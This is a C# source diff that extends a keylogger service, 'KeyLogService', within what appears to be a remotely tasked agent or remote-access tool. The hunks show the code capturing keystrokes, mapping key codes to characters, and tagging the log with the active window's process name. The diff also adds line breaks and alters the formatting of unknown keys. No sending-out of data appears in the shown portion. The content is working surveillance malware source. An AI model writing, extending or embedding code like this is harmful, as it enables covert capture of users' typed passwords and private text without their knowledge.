@@ -2,6 +2,8 @@
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Threading.Tasks;
+using EntryPoint;
+using Shared;
 
 namespace Agent.Service
 {
@@ -11,6 +13,8 @@ namespace Agent.Service
     }
     public class KeyLogService : RunningService, IKeyLogService
     {
+        public override int MinimumDelay { get => 2; }
+        protected override JobType? JobType => Shared.JobType.KeyLog;
         public override string ServiceName => "Key Logger";
 
         public string LoggedKeyStrokes { get; private set; } = string.Empty;
@@ -30,8 +34,10 @@ namespace Agent.Service
 
         public override void Start()
         {
+            this.LoggedKeyStrokes = string.Empty;
             activeProcessName = GetActiveWindowProcessName().ToLower();
             prevProcessName = activeProcessName;
+            LoggedKeyStrokes += Environment.NewLine + "[--" + activeProcessName + "--]" + Environment.NewLine;
             base.Start();
         }
 
@@ -41,7 +47,7 @@ namespace Agent.Service
             bool isOldProcess = activeProcessName.Equals(prevProcessName);
             if (!isOldProcess)
             {
-                LoggedKeyStrokes += Environment.NewLine + "[--" + activeProcessName + "--]";
+                LoggedKeyStrokes += Environment.NewLine + "[--" + activeProcessName + "--]" + Environment.NewLine;
                 prevProcessName = activeProcessName;
             }
 
@@ -54,8 +60,11 @@ namespace Agent.Service
                 if (key == 32769)
                 {
                     var keyStr = verifyKey(i);
+                    
                     //Debug.WriteLine($"Pressed {i} : {keyStr}");
                     LoggedKeyStrokes += keyStr;
+                    if (keyStr == "[Enter]")
+                        LoggedKeyStrokes += Environment.NewLine;
                 }
             }
         }
@@ -83,15 +92,15 @@ namespace Agent.Service
             if (code < 8) key = "";
             else if (code == 8) key = "[Back]";
             else if (code == 9) key = "[TAB]";
-            else if (code == 10) key = "";
-            else if (code == 11) key = "";
-            else if (code == 12) key = "";
+            //else if (code == 10) key = "";
+            //else if (code == 11) key = "";
+            //else if (code == 12) key = "";
             else if (code == 13) key = "[Enter]";
-            else if (code == 14) key = "";
-            else if (code == 15) key = "";
-            else if (code == 16) key = "";
-            else if (code == 17) key = "";
-            else if (code == 18) key = "";
+            //else if (code == 14) key = "";
+            //else if (code == 15) key = "";
+            //else if (code == 16) key = "";
+            //else if (code == 17) key = "";
+            //else if (code == 18) key = "";
             else if (code == 19) key = "[Pause]";
             else if (code == 20) key = "[Caps Lock]";
             else if (code == 27) key = "[Esc]";
@@ -194,7 +203,7 @@ namespace Agent.Service
             else if (code == 221) key = "^";
             else if (code == 222) key = "²";
             else if (code == 223) key = "!";
-            else key = "[" + code + "]";
+            else key = "{" + code + "}";
 
             return key;
         }
